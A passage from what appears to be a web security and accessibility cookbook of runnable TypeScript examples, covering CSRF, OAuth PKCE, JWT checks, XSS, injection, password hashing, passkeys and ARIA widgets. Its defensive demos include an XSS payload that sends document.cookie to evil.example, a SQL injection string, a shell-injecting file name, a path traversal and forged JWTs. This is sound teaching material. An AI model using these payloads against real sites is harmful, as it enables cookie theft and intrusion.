  if (req.headers.authorization && !req.headers.cookie) return true;   // a token client: no cookie to forge
  const site = req.headers["sec-fetch-site"];      // sent by current browsers; a page cannot forge it
  if (site !== undefined) return site === "same-origin";
  return req.headers.origin === APP_ORIGIN;        // older browsers; absent = unknown = refused
}

const server = createServer((req, res) => {
  res.setHeader("strict-transport-security", "max-age=63072000; includeSubDomains");
  res.setHeader("content-security-policy", CSP);
  res.setHeader("vary", "Sec-Fetch-Site, Origin");
  if (req.method !== "POST") {
    res.writeHead(405, { allow: "POST" }).end();   // a link or an <img> never signs anyone in
  } else if (!mayWrite(req)) {
    res.writeHead(403).end();                      // checked before sign-in too: no login CSRF
  } else {
    if (req.url === "/session") res.setHeader("set-cookie", SESSION_COOKIE);   // POST /orders: no cookie
    res.writeHead(req.url === "/session" ? 204 : 201).end();
  }
}).listen(0, "127.0.0.1");
await once(server, "listening");
const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;

const attempts: [string, string, string, Record<string, string>][] = [   // what each sender transmits
  ["a form on evil.example", "POST", "/session", { "sec-fetch-site": "cross-site" }],
  ["no Origin, no Sec-Fetch-Site", "POST", "/session", {}],
  ["a link on evil.example", "GET", "/session", { "sec-fetch-site": "cross-site" }],
  ["an API client with a token", "POST", "/orders", { authorization: "Bearer at-1" }],
  ["our own page", "POST", "/session", { "sec-fetch-site": "same-origin" }],
];
for (const [sender, method, path, headers] of attempts) {
  const res = await fetch(base + path, { method, headers });
  console.log(`${sender}: ${method} ${path} ${res.status}`, res.headers.getSetCookie()[0] ?? "(no cookie)");
}
server.close();
Result
a form on evil.example: POST /session 403 (no cookie)
no Origin, no Sec-Fetch-Site: POST /session 403 (no cookie)
a link on evil.example: GET /session 405 (no cookie)
an API client with a token: POST /orders 201 (no cookie)
our own page: POST /session 204 __Host-session=opaque-random-id; HttpOnly; Secure; SameSite=Lax; Path=/
Setup

  2. Save as main.mts and run node main.mts

Ran with Node 24.16.0, TypeScript 5.9.3 on 2026-11-16: the output matched the result shown.

Sources: Using HTTP cookies — MDN · Cross-Site Request Forgery Prevention — OWASP · Sec-Fetch-Site — MDN

OAuth 2.0 authorization code with PKCE

The browser keeps a random verifier for the redirect round trip and sends only its SHA-256 challenge; a stolen authorization code is useless without the verifier, state ties the callback to this tab, and both are deleted once used.

const base64url = (bytes: Uint8Array) =>
  btoa(String.fromCharCode(...bytes)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
const s256 = async (text: string) =>
  base64url(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text))));
const random = (bytes: number) => base64url(crypto.getRandomValues(new Uint8Array(bytes)));

const memory = new Map<string, string>();         // Node has no sessionStorage: a Map stands in for it
const storage = globalThis.sessionStorage ?? {
  getItem: (key: string) => memory.get(key) ?? null,
  setItem: (key: string, value: string) => void memory.set(key, value),
  removeItem: (key: string) => void memory.delete(key),
};

const CLIENT = { client_id: "shop-web", redirect_uri: "https://app.shop.example/callback" };

const verifier = random(32);                       // 1. before redirecting: 43 characters, 256 bits
const state = random(16);
storage.setItem("pkce", JSON.stringify({ verifier, state }));
const authorize = new URL("https://id.example/oauth2/authorize?" + new URLSearchParams({ ...CLIENT,
  response_type: "code", scope: "openid orders:read", state, code_challenge: await s256(verifier),
  code_challenge_method: "S256" }));

const issued = new Map([["code-789", authorize.searchParams.get("code_challenge")]]);   // the IdP, condensed
const tokenEndpoint = async (form: URLSearchParams) =>
  issued.get(form.get("code") ?? "") === (await s256(form.get("code_verifier") ?? ""))
    ? Response.json({ access_token: "at-1", refresh_token: "rt-1", expires_in: 300 })
    : Response.json({ error: "invalid_grant" }, { status: 400 });

// 2. Back on /callback?code=…&state=…
async function handleCallback(url: URL, verifierOverride?: string): Promise<string> {
  if (url.searchParams.has("error")) throw new Error(`sign-in failed: ${url.searchParams.get("error")}`);
  const saved = JSON.parse(storage.getItem("pkce") ?? "null") as { verifier: string; state: string } | null;
  if (!saved || url.searchParams.get("state") !== saved.state) throw new Error("state mismatch");
  const response = await tokenEndpoint(new URLSearchParams({ ...CLIENT, grant_type: "authorization_code",
    code: url.searchParams.get("code") ?? "", code_verifier: verifierOverride ?? saved.verifier }));
  storage.removeItem("pkce");                      // single use, whatever the outcome
  return response.ok ? `signed in (${response.status})` : `refused (${response.status})`;
}

const callback = new URL(`${CLIENT.redirect_uri}?code=code-789&state=${state}`);
const run = (url: URL, verifier?: string) => handleCallback(url, verifier).catch((e: Error) => e.message);
console.log("stolen code, guessed verifier:", await run(callback, random(32)));
storage.setItem("pkce", JSON.stringify({ verifier, state }));
console.log("our tab:", await run(callback));
console.log("replayed callback:", await run(callback));
console.log("user cancelled:", await run(new URL(`${CLIENT.redirect_uri}?error=access_denied`)));
Result
stolen code, guessed verifier: refused (400)
our tab: signed in (200)
replayed callback: state mismatch
user cancelled: sign-in failed: access_denied
Setup
  1. Node.js 22.18 or later, or a browser page (where sessionStorage is the real one)
  2. Save as main.mts and run node main.mts

Ran with Node 24.16.0, TypeScript 5.9.3 on 2026-11-16: the output matched the result shown.

Sources: RFC 7636 — Proof Key for Code Exchange · RFC 9700 — Best Current Practice for OAuth 2.0 Security

Refresh tokens that rotate on every use

Per RFC 10017 a browser client's refresh token must rotate on each use or be sender-constrained (DPoP) and must expire after a maximum or idle lifetime, unless it never reaches the browser at all (a BFF) — the REST sheet's single-flight card shows the client side of a 401.

import { z } from "zod";

// The identity provider's side, condensed: one family per sign-in, one live token per family.
type Family = { live: string; revoked: boolean };

const families = new Map<string, Family>([["rt-0", { live: "rt-0", revoked: false }]]);
let issued = 0;

function tokenEndpoint(form: URLSearchParams): Response {
  const presented = form.get("refresh_token") ?? "";
  const family = families.get(presented);
  if (family && family.live !== presented) family.revoked = true;   // reuse = a stolen copy: kill the family
  if (!family || family.revoked) return Response.json({ error: "invalid_grant" }, { status: 400 });
  family.live = `rt-${++issued}`;
  families.set(family.live, family);
  return Response.json({ access_token: `at-${issued}`, refresh_token: family.live, expires_in: 300 });
}

// The client's side: a BFF, or a SPA that keeps the refresh token in memory only.
const Tokens = z.object({ access_token: z.string(), refresh_token: z.string(), expires_in: z.number() });

async function refresh(refreshToken: string) {
  const response = tokenEndpoint(new URLSearchParams({
    grant_type: "refresh_token", refresh_token: refreshToken, client_id: "shop-web",
  }));
  if (!response.ok) throw new Error(`signed out (${response.status}): send the user to sign-in`);
  return Tokens.parse(await response.json());
}

const first = await refresh("rt-0");
const second = await refresh(first.refresh_token);
console.log("legitimate:", first.refresh_token, "->", second.refresh_token);

await refresh("rt-0").catch((e: Error) => console.log("attacker replays rt-0:", e.message));
await refresh(second.refresh_token).catch((e: Error) => console.log("victim, next refresh:", e.message));
Result
legitimate: rt-1 -> rt-2
attacker replays rt-0: signed out (400): send the user to sign-in
victim, next refresh: signed out (400): send the user to sign-in

  2. npm i zod
  3. Save as main.mts and run node main.mts

Verify a JWT with jose

Decoding is not verifying: an API trusts a token only after a vetted library has checked the signature against the issuer's keys, an algorithm the API chose, the token type, iss, aud, exp, nbf and the claims it requires.

import { SignJWT, createLocalJWKSet, exportJWK, generateKeyPair, jwtVerify } from "jose";

// Stand-in identity provider: an ES256 key and the JWKS it publishes.
const { privateKey, publicKey } = await generateKeyPair("ES256");
const jwks = createLocalJWKSet({ keys: [{ ...(await exportJWK(publicKey)), kid: "2026-11", alg: "ES256" }] });
// In production: createRemoteJWKSet(new URL("https://id.example/.well-known/jwks.json")), cached by kid

const now = 1_800_000_000;                       // injected clock, in seconds
const claims = { iss: "https://id.example", aud: "orders-api", sub: "user-42", exp: now + 300 };
const sign = (payload: object, typ = "at+jwt") =>
  new SignJWT({ ...payload }).setProtectedHeader({ alg: "ES256", kid: "2026-11", typ }).sign(privateKey);

async function authenticate(token: string, atSeconds = now): Promise<string | undefined> {
  const { payload } = await jwtVerify(token, jwks, {
    algorithms: ["ES256"],                       // the token never picks its own algorithm
    issuer: "https://id.example",
    audience: "orders-api",
    typ: "at+jwt",                               // an access token, not an ID token replayed (RFC 9068)
    requiredClaims: ["exp", "sub"],
    clockTolerance: 30,
    currentDate: new Date(atSeconds * 1000),
  });
  return payload.sub;
}

const good = await sign(claims);
const [header, , signature] = good.split(".");
const { exp: _exp, ...noExp } = claims;
const forgedBody = Buffer.from(JSON.stringify({ ...claims, sub: "admin" })).toString("base64url");
const cases: [string, string, number?][] = [
  ["valid", good],
  ["aud as an array", await sign({ ...claims, aud: ["orders-api", "billing"] })],
  ["no exp", await sign(noExp)],
  ["an hour later", good, now + 3600],
  ["wrong audience", await sign({ ...claims, aud: "billing" })],
  ["an ID token", await sign(claims, "JWT")],
  ["edited payload", `${header}.${forgedBody}.${signature}`],
  ["alg none", `${Buffer.from('{"alg":"none"}').toString("base64url")}.${forgedBody}.`],
];
for (const [label, token, at] of cases) {
  console.log(`${label}:`, await authenticate(token, at).catch((e: Error) => `refused — ${e.message}`));
}
Result
valid: user-42
aud as an array: user-42
no exp: refused — missing required "exp" claim
an hour later: refused — "exp" claim timestamp check failed
wrong audience: refused — unexpected "aud" claim value
an ID token: refused — unexpected "typ" JWT header value
edited payload: refused — signature verification failed
alg none: refused — "alg" (Algorithm) Header Parameter value not allowed

XSS: text is not markup

Anything a user typed goes into the page as text (textContent) and into links only after a scheme check, while HTML strings come only from a sanitiser that Trusted Types can enforce.

import { JSDOM } from "jsdom";

const { document } = new JSDOM(`<ul id="reviews"></ul>`).window;
const list = document.querySelector("#reviews")!;
const review = {
  author: "Mallory",
  text: `Nice mug <img src=x onerror="fetch('//evil.example?c='+document.cookie)">`,
  site: "javascript:alert(1)",
};

function renderUnsafe(r: typeof review) {
  list.insertAdjacentHTML("beforeend", `<li>${r.author}: ${r.text}</li>`);   // the markup runs
}

function safeHref(url: string): string | null {
  try {
    const parsed = new URL(url, "https://app.shop.example");
    return parsed.protocol === "https:" || parsed.protocol === "http:" ? parsed.href : null;
  } catch {
    return null;
  }
}

function renderSafe(r: typeof review) {
  const item = document.createElement("li");
  const link = document.createElement("a");
  link.textContent = r.author;                     // text, whatever it contains
  const href = safeHref(r.site);
  if (href) link.href = href;                      // no javascript: URLs
  item.append(link, `: ${r.text}`);                // a string argument becomes a text node
  list.append(item);
}

renderUnsafe(review);
console.log("unsafe: <img onerror> elements =", list.querySelectorAll("img[onerror]").length);
list.replaceChildren();
renderSafe(review);
const href = list.querySelector("a")!.getAttribute("href");
console.log("safe: elements =", list.querySelectorAll("img").length, "| link href =", href);
console.log("safe: shown as", JSON.stringify(list.textContent!.slice(0, 22) + "…"));
Result
unsafe: <img onerror> elements = 1
safe: elements = 0 | link href = null
safe: shown as "Mallory: Nice mug <img…"

Injection: parameters, argv and contained paths

On the server input is data, never code: bind SQL values as parameters, pass program arguments as an array instead of a shell string, and resolve file names inside a fixed directory.

import { DatabaseSync } from "node:sqlite";   // Node 22 prints an ExperimentalWarning for it: expected
import { exec, execFile } from "node:child_process";
import { promisify } from "node:util";
import path from "node:path";

const db = new DatabaseSync(":memory:");
db.exec("CREATE TABLE orders (id TEXT, owner TEXT)");
db.exec("INSERT INTO orders VALUES ('o-1', 'ana'), ('o-2', 'ben')");
const owner = "ana' OR '1'='1";                    // from ?owner= in the URL

// The same `?` (or `$1`) binding works with pg, mysql2 and better-sqlite3.
const spliced = db.prepare(`SELECT id FROM orders WHERE owner = '${owner}'`).all();
const bound = db.prepare("SELECT id FROM orders WHERE owner = ?").all(owner);   // a value, never SQL
console.log("SQL spliced:", spliced.length, "rows | parameter:", bound.length, "rows");

const upload = "invoice.pdf; echo PWNED";           // an uploaded file's name
const shell = await promisify(exec)(`echo converting ${upload}`);              // a shell parses this
const argv = await promisify(execFile)("echo", ["converting", upload]);       // no shell at all
console.log("shell:", JSON.stringify(shell.stdout), "| argv:", JSON.stringify(argv.stdout));

const UPLOADS = path.resolve("/srv/uploads");

// A lexical check: if the folder can hold symlinks, fs.realpath the result before comparing.
function insideUploads(name: string): string {
  const full = path.resolve(UPLOADS, name);
  if (!full.startsWith(UPLOADS + path.sep)) throw new Error(`refused path ${JSON.stringify(name)}`);
  return full;
}

console.log(insideUploads("o-1/invoice.pdf"));
try {
  insideUploads("../../etc/passwd");
} catch (e) {
  console.log((e as Error).message);
}

shell: "converting invoice.pdf\nPWNED\n" | argv: "converting invoice.pdf; echo PWNED\n"

Web Crypto: AES-GCM encryption and SHA-256

Encrypt a local draft with a non-extractable key and a fresh 12-byte IV (GCM rejects a tampered byte) and hash to fingerprint content, remembering that a page-held key protects data at rest, not from script running in the page.

const encoder = new TextEncoder();
const hex = (buffer: ArrayBuffer) =>
  [...new Uint8Array(buffer)].map((b) => b.toString(16).padStart(2, "0")).join("");

// false = non-extractable: scripts can use the key, never read its bytes (IndexedDB can store it)
const key = await crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);

type Sealed = { iv: Uint8Array<ArrayBuffer>; data: Uint8Array<ArrayBuffer> };

async function seal(plaintext: string): Promise<Sealed> {
  const iv = crypto.getRandomValues(new Uint8Array(12));   // never reuse an IV with the same key
  const data = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoder.encode(plaintext));
  return { iv, data: new Uint8Array(data) };
}

async function open({ iv, data }: Sealed): Promise<string> {
  return new TextDecoder().decode(await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data));
}

const note = "Ship order o-1 to 12 Rose Lane";
const draft = await seal(note);
console.log(await open(draft));
console.log("ciphertext = plaintext + 16-byte tag:", draft.data.length === encoder.encode(note).length + 16);

draft.data[0]! ^= 1;                               // tamper with one bit
await open(draft).catch((e: DOMException) => console.log("tampered:", e.name));

const exportFile = encoder.encode("orders-2026-11.csv contents");
console.log("sha-256:", hex(await crypto.subtle.digest("SHA-256", exportFile)));
Result
Ship order o-1 to 12 Rose Lane
ciphertext = plaintext + 16-byte tag: true
tampered: OperationError
sha-256: 1d00b16a21196b21cdf3c0437c5d8f05282e816684d3f9547b905e1050ccef08

Passwords: a slow, salted KDF on the server

Store passwords with a slow, salted KDF — here scrypt at OWASP's minimum, N=2^17, r=8, p=1, which needs maxmem above Node's 32 MiB default — in a PHC-style string, compared in constant time, failing closed on a corrupt record and re-hashed when the parameters change.

import { scrypt, randomBytes, timingSafeEqual } from "node:crypto";

// Prefer Argon2id where you have it (OWASP: m=19 MiB, t=2, p=1): crypto.argon2("argon2id", …) on
// Node 24.7+ ("Stability: 1.2 - Release candidate"), or the argon2 npm package on Node 22.
type Params = { log2N: number; r: number; p: number };
const CURRENT: Params = { log2N: 17, r: 8, p: 1 };   // OWASP's scrypt minimum: N=2^17, r=8, p=1 (128 MiB)
const MAXMEM = 256 * 1024 * 1024;                    // Node's 32 MiB default would throw for these
const b64 = (bytes: Buffer) => bytes.toString("base64").replace(/=+$/, "");

function derive(password: string, salt: Buffer, { log2N, r, p }: Params): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    const options = { N: 2 ** log2N, r, p, maxmem: MAXMEM };
    scrypt(password.normalize("NFKC"), salt, 32, options, (err, key) => (err ? reject(err) : resolve(key)));
  });
}

async function hashPassword(password: string, params = CURRENT): Promise<string> {
  const salt = randomBytes(16);                      // unique per user: equal passwords hash differently
  const key = await derive(password, salt, params);
  return `$scrypt$ln=${params.log2N},r=${params.r},p=${params.p}$${b64(salt)}$${b64(key)}`;   // PHC style
}

const STORED = /^\$scrypt\$ln=(\d+),r=(\d+),p=(\d+)\$([A-Za-z0-9+/]{22})\$([A-Za-z0-9+/]{43})$/;

async function verifyPassword(password: string, stored: string) {
  const m = STORED.exec(stored);
  if (!m) return { ok: false, rehash: false };      // corrupt or foreign record: a failed login, not a crash
  const params = { log2N: Number(m[1]), r: Number(m[2]), p: Number(m[3]) };
  const key = await derive(password, Buffer.from(m[4]!, "base64"), params).catch(() => null);
  const ok = key !== null && timingSafeEqual(key, Buffer.from(m[5]!, "base64"));   // both 32 bytes
  const outdated = params.log2N < CURRENT.log2N || params.r < CURRENT.r || params.p < CURRENT.p;
  return { ok, rehash: ok && outdated };            // re-hash with CURRENT while the password is at hand
}

const pass = "correct horse battery staple";
const stored = await hashPassword(pass);
console.log(stored.startsWith("$scrypt$ln=17,r=8,p=1$"), "| salted:", stored !== (await hashPassword(pass)));
console.log("right:", await verifyPassword(pass, stored));
console.log("wrong:", await verifyPassword(pass + "r", stored));
console.log("corrupt:", await verifyPassword(pass, stored.slice(0, -5)));
const legacy = await hashPassword(pass, { log2N: 14, r: 8, p: 1 });   // last year's setting
console.log("old parameters:", await verifyPassword(pass, legacy));
Result
true | salted: true
right: { ok: true, rehash: false }
wrong: { ok: false, rehash: false }
corrupt: { ok: false, rehash: false }
old parameters: { ok: true, rehash: true }

Passkeys with WebAuthn, in outline

The server issues a one-time challenge as JSON, the browser asks the authenticator (Face ID, Windows Hello, a security key), and the server verifies the signed response, so no shared secret ever exists (the JSON helpers are Baseline 2025).

async function postJson(path: string, body: unknown = {}): Promise<any> {
  const response = await fetch(path, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!response.ok) throw new Error(`${path}: HTTP ${response.status}`);
  return response.json();
}

export async function registerPasskey(): Promise<void> {
  const options = await postJson("/webauthn/register/options");   // rp, user, challenge, algorithms
  const credential = await navigator.credentials.create({
    publicKey: PublicKeyCredential.parseCreationOptionsFromJSON(options),
  });
  if (!(credential instanceof PublicKeyCredential)) throw new Error("registration cancelled");
  await postJson("/webauthn/register/verify", credential.toJSON());   // the server stores the public key
}

export async function signInWithPasskey(signal: AbortSignal): Promise<void> {
  const options = await postJson("/webauthn/login/options");
  const conditional = await PublicKeyCredential.isConditionalMediationAvailable?.();
  const credential = await navigator.credentials.get({
    publicKey: PublicKeyCredential.parseRequestOptionsFromJSON(options),
    mediation: conditional ? "conditional" : "optional",   // conditional: offered in username autofill
    signal,
  });
  if (!(credential instanceof PublicKeyCredential)) throw new Error("sign-in cancelled");
  await postJson("/webauthn/login/verify", credential.toJSON());   // signature, challenge, origin checked
}
Result

Registration stores a passkey on the user's device; afterwards the username field offers it in autofill and signing in needs only the device's biometric or PIN.

Setup
  1. A page served over HTTPS (or localhost) whose origin matches the relying-party ID
  2. A server that creates and verifies WebAuthn options — e.g. with @simplewebauthn/server — at /webauthn/*
  3. An <input autocomplete="username webauthn"> on the sign-in page for passkey autofill

Secrets in config, validation at the boundary, redaction in the logger

Read secrets from the server's environment and validate them once at startup, validate every request body before it touches the domain, and redact inside the logger (pino's redact paths, or better an allowlist of loggable fields) so no call site can forget.

import { z } from "zod";

const Config = z.object({
  DATABASE_URL: z.url(),
  PAYMENT_API_KEY: z.string().min(20),             // server-only: never prefixed VITE_ / NEXT_PUBLIC_
});

function loadConfig(env: Record<string, string | undefined>) {
  const result = Config.safeParse(env);
  const names = result.error?.issues.map((i) => i.path.join(".")).join(", ");   // names, never values
  if (!result.success) throw new Error(`invalid config: ${names}`);
  return result.data;
}

const SignUp = z.strictObject({                    // unknown keys rejected: no `isAdmin: true` smuggled in
  email: z.email(),
  displayName: z.string().trim().min(1).max(50),
  password: z.string().min(12).max(200),
});

const SENSITIVE = /pass|token|secret|authorization|cookie|key|email/i;
function redact(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(redact);
  if (value === null || typeof value !== "object") return value;
  const entries = Object.entries(value).map(([k, v]) => [k, SENSITIVE.test(k) ? "[redacted]" : redact(v)]);
  return Object.fromEntries(entries);
}

const log = (event: string, data: object) =>      // every log line goes through here
  console.log(JSON.stringify({ event, ...(redact(data) as object) }));

try {
  loadConfig({ DATABASE_URL: "postgres://db.internal/shop", PAYMENT_API_KEY: "sk_short" });
} catch (e) {
  console.log((e as Error).message);
}

const body = { email: "ana@example.com", displayName: "Ana", password: "a long passphrase", isAdmin: true };
const parsed = SignUp.safeParse(body);
console.log("sign-up accepted:", parsed.success, parsed.error?.issues.map((i) => i.code).join(","));
log("signup_rejected", { headers: { authorization: "Bearer at-123" }, body });
Result
invalid config: PAYMENT_API_KEY
sign-up accepted: false unrecognized_keys
{"event":"signup_rejected","headers":{"authorization":"[redacted]"},"body":{"email":"[redacted]","displayName":"Ana","password":"[redacted]","isAdmin":true}}

Security and privacy rules

What reviewers and auditors look for first.

  • Tokens in localStorage, secrets in the bundle, or decodeJwt() used as authentication. The browser is not a safe; the server decides.
  • innerHTML, insertAdjacentHTML, eval and new Function with data. require-trusted-types-for 'script' (Baseline 2026) makes the browser refuse them — roll it out in Content-Security-Policy-Report-Only first, then add named policies, because it breaks every library that writes HTML strings.
  • SQL built with template strings, exec() with interpolated input, file paths joined from user input. Bind parameters, use execFile with an argument array, resolve paths inside a fixed directory.
  • rejectUnauthorized: false, NODE_TLS_REJECT_UNAUTHORIZED=0 or a custom checkServerIdentity that returns early — TLS without certificate verification is plaintext with extra steps. Add a private CA with ca: or NODE_EXTRA_CA_CERTS instead.
  • HTTPS everywhere with HSTS; cookies HttpOnly; Secure; SameSite=Lax with the __Host- prefix; refuse writes whose origin is not proven to be yours.
  • Validate at every boundary — request bodies, query strings, environment, webhooks, postMessage — with a schema, and reject unknown keys on writes.
  • Minimise: collect only the fields a feature needs, keep them only as long as it needs them, and delete on account closure. Consent: load analytics and marketing scripts only after an explicit opt-in, and make withdrawing as easy as granting.
  • Logging request bodies, headers, tokens, passwords, card numbers or full emails. Redact in the logger's configuration, not at each call site.
  • Prefer Argon2id for passwords where you have it (OWASP: m=19 MiB, t=2, p=1): crypto.argon2("argon2id", …) on Node 24.7+ ("Stability: 1.2 - Release candidate"), or the argon2 npm package on Node 22; scrypt at N=2^17, r=8, p=1 is OWASP's fallback.
  • Crypto primitives come from crypto.subtle or node:crypto, never a hand-rolled algorithm; let vetted libraries (jose, oidc-client-ts, SimpleWebAuthn) own the protocols.

Role, name, state — from HTML first

A native element brings its role, name, keyboard behaviour and states for free; ARIA only changes what is announced, never what happens.

You needUseRoleName fromState

to go somewhere<a href>linkits textaria-current="page"
an image<img alt="…">; <figure> + <figcaption> for a visible captionimg; none when alt=""alt: what the image tells, not what it shows; alt="" when decorative—
text input<input> + <label for>textbox, searchboxthe labelrequired, aria-invalid; hint via aria-describedby
on/off<input type="checkbox">checkboxthe labelchecked, indeterminate
one of several<fieldset> + <legend> + radios, or <select>group of radio (add role="radiogroup" to announce it as one); combobox, or listbox with multiple or size > 1the legend or labelchecked, selected
a value in a range<input type="range">sliderthe labelvalue; aria-valuetext for units, kept in sync

Accessible names and text alternatives

If a query by role and name cannot find the control, a screen reader user cannot either — the icon-only div below is invisible to both.

import { JSDOM } from "jsdom";
import { queryAllByRole, queryByRole, type ByRoleOptions } from "@testing-library/dom";

const { window } = new JSDOM(`<!doctype html><section class="player">
  <img src="kind-of-blue.jpg" alt="Album cover: Kind of Blue"> <img src="divider.svg" alt="">
  <button type="button" aria-label="Play"><svg aria-hidden="true" viewBox="0 0 24 24"></svg></button>
  <div class="icon-button" onclick="pause()">⏸</div>
  <label for="volume">Volume</label>
  <input id="volume" type="range" min="0" max="100" value="30" aria-valuetext="30 percent">
  <h2 id="queue-title">Up next</h2> <ul aria-labelledby="queue-title"><li>Blue in Green</li></ul>
</section>`);
const body = window.document.body;

const checks: [string, ByRoleOptions][] = [
  ["img", { name: "Album cover: Kind of Blue" }], // alt says what the image tells the reader
  ["button", { name: "Play" }],                   // the name comes from aria-label; the svg is hidden
  ["button", { name: "⏸" }],                      // a div with onclick: no role, no focus, no keyboard
  ["slider", { name: "Volume" }],                 // <label for> names the input
  ["list", { name: "Up next" }],                  // aria-labelledby reuses visible text
];
for (const [role, options] of checks) {
  const found = queryByRole(body, role, options);
  console.log(`${role} "${options.name}": ${found ? `<${found.tagName.toLowerCase()}>` : "not found"}`);
}
console.log("images exposed:", queryAllByRole(body, "img").length);   // alt="" removes the divider

// aria-valuetext must follow the value, or the slider keeps announcing "30 percent"
const volume = queryByRole(body, "slider", { name: "Volume" }) as HTMLInputElement;
volume.addEventListener("input", () => volume.setAttribute("aria-valuetext", `${volume.value} percent`));
volume.value = "55";
volume.dispatchEvent(new window.Event("input", { bubbles: true }));
console.log("valuetext:", JSON.stringify(volume.getAttribute("aria-valuetext")));
Result
img "Album cover: Kind of Blue": <img>
button "Play": <button>
button "⏸": not found
slider "Volume": <input>
list "Up next": <ul>
images exposed: 1
valuetext: "55 percent"

A disclosure built correctly

A real <button> is focusable and answers Enter and Space, you add aria-expanded and the hiding, and a panel that overlays content must also close on Escape and when focus leaves it.

import { JSDOM } from "jsdom";
import { getByRole, queryByRole } from "@testing-library/dom";

const { document, KeyboardEvent } = new JSDOM(`<!doctype html><div class="filter-menu">
    <button type="button" aria-expanded="false" aria-controls="filters">Filters</button>
    <div id="filters" class="popover" hidden><label><input type="checkbox"> In stock only</label></div>
  </div><a href="#results">Skip to results</a>`).window;

// without script: <button popovertarget="filters"> and <div id="filters" popover> give light dismiss,
// Escape and the expanded state natively; this is the scripted equivalent
function overlayDisclosure(button: HTMLButtonElement): void {
  const panel = document.getElementById(button.getAttribute("aria-controls")!)!;
  const menu = button.parentElement!;            // the button and its panel
  const setOpen = (open: boolean) => {
    button.setAttribute("aria-expanded", String(open));
    panel.hidden = !open;                        // hidden: out of the tab order and the accessibility tree
  };
  button.addEventListener("click", () => setOpen(button.getAttribute("aria-expanded") !== "true"));
  // it covers the results, so it must get out of the way: on Escape, and when focus leaves it
  menu.addEventListener("keydown", (event) => {
    if (event.key !== "Escape" || panel.hidden) return;
    setOpen(false);
    button.focus();                              // never leave focus on an element that just disappeared
  });
  menu.addEventListener("focusout", (event) => {   // Tab past the panel, or a click elsewhere
    if (!menu.contains(event.relatedTarget as Node | null)) setOpen(false);
  });
}

const button = getByRole(document.body, "button", { name: "Filters" }) as HTMLButtonElement;
overlayDisclosure(button);
const checkbox = () => queryByRole(document.body, "checkbox", { name: "In stock only" });   // null if hidden
const state = () => `${button.getAttribute("aria-expanded")}, focus: ${document.activeElement?.textContent}`;
console.log("closed, checkbox reachable:", checkbox() !== null);
button.click();
checkbox()!.focus();
checkbox()!.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
console.log("after Escape: expanded", state());
button.click();
checkbox()!.focus();
getByRole(document.body, "link", { name: "Skip to results" }).focus();
console.log("after focus left: expanded", state());
Result
closed, checkbox reachable: false
after Escape: expanded false, focus: Filters
after focus left: expanded false, focus: Skip to results

  2. npm i jsdom @testing-library/dom

A modal dialog with focus in and focus back

showModal() gives you the focus trap, the inert background and Escape; you choose the initial focus and, when the opener is gone, where focus goes next.

const dialog = document.querySelector<HTMLDialogElement>("#remove-dialog")!;
const list = document.querySelector<HTMLUListElement>("#cart-items")!;
let pending: HTMLLIElement | null = null;

list.addEventListener("click", (event) => {
  const remove = (event.target as Element).closest<HTMLButtonElement>("button[data-remove]");
  if (!remove) return;
  pending = remove.closest("li");
  dialog.returnValue = "";
  // modal: focus moves to [autofocus] ("Keep it", the safe choice), the page behind becomes inert,
  // and Escape closes it as a cancel
  dialog.showModal();
});

// a <form method="dialog"> button closes the dialog with its value as returnValue
dialog.addEventListener("close", () => {
  const item = pending;
  pending = null;
  if (!item || dialog.returnValue !== "remove") return;   // kept: the browser returns focus to the opener
  const neighbour = item.nextElementSibling ?? item.previousElementSibling;
  item.remove();
  // the opener was inside the removed item, so focus would fall to <body>: put it somewhere useful
  const target = neighbour?.querySelector<HTMLElement>("button[data-remove]")
    ?? document.querySelector<HTMLElement>("#cart-heading");
  target?.focus();
});
Result

Remove opens the dialog with focus on Keep it and the cart behind it unreachable; Escape or Keep it returns focus to that Remove button; Remove deletes the item and focuses the next item's Remove button, or the Cart heading when none is left.

Setup
  1. A page with <h2 id="cart-heading" tabindex="-1">Cart</h2>, a <ul id="cart-items"> whose items each hold a <button data-remove>Remove</button>, and <dialog id="remove-dialog" aria-labelledby="remove-title"><h2 id="remove-title">Remove this item?</h2><form method="dialog"><button value="keep" autofocus>Keep it</button> <button value="remove">Remove</button></form></dialog>
  2. Compile with tsc (lib including DOM) or a bundler, and load the output with <script type="module">

Compiled with TypeScript 5.9.3 (lib DOM) on 2026-11-16; not run here — running it needs a browser page with the elements named in the setup.

Keyboard operation with a roving tabindex

A toolbar, tab list or grid is one Tab stop inside which arrow keys move focus, and exactly one item has tabindex="0" — the last one used, however it got focus.

import { JSDOM } from "jsdom";
import { getByRole } from "@testing-library/dom";

const { window } = new JSDOM(`<!doctype html>
  <div role="toolbar" aria-label="Formatting">
    <button type="button">Bold</button> <button type="button">Italic</button>
    <button type="button">Link</button>
  </div>`);
const { document } = window;

function rovingFocus(container: HTMLElement): void {
  const items = Array.from(container.querySelectorAll<HTMLElement>("button"));
  const activate = (index: number) => items.forEach((item, i) => (item.tabIndex = i === index ? 0 : -1));
  activate(0);
  // a click or a script can focus an item too: Tab must come back to that one, not a stale one
  container.addEventListener("focusin", (event) => {
    const index = items.indexOf(event.target as HTMLElement);
    if (index !== -1) activate(index);
  });
  container.addEventListener("keydown", (event) => {
    const current = items.indexOf(document.activeElement as HTMLElement);
    const to: Record<string, number> = { ArrowRight: current + 1, ArrowLeft: current - 1, Home: 0, End: -1 };
    const target = to[event.key];
    if (target === undefined || current === -1) return;
    event.preventDefault();                  // keep arrows from scrolling the page
    items.at(target % items.length)!.focus();   // wraps both ways; focusin moves the tabindex
  });
}

const toolbar = getByRole(document.body, "toolbar", { name: "Formatting" });
rovingFocus(toolbar);
getByRole(toolbar, "button", { name: "Italic" }).focus();   // e.g. the user clicked it
for (const key of ["ArrowRight", "ArrowRight", "ArrowLeft", "Home"]) {
  document.activeElement!.dispatchEvent(new window.KeyboardEvent("keydown", { key, bubbles: true }));
  const stops = Array.from(toolbar.querySelectorAll("button"), (b) => `${b.textContent}:${b.tabIndex}`);
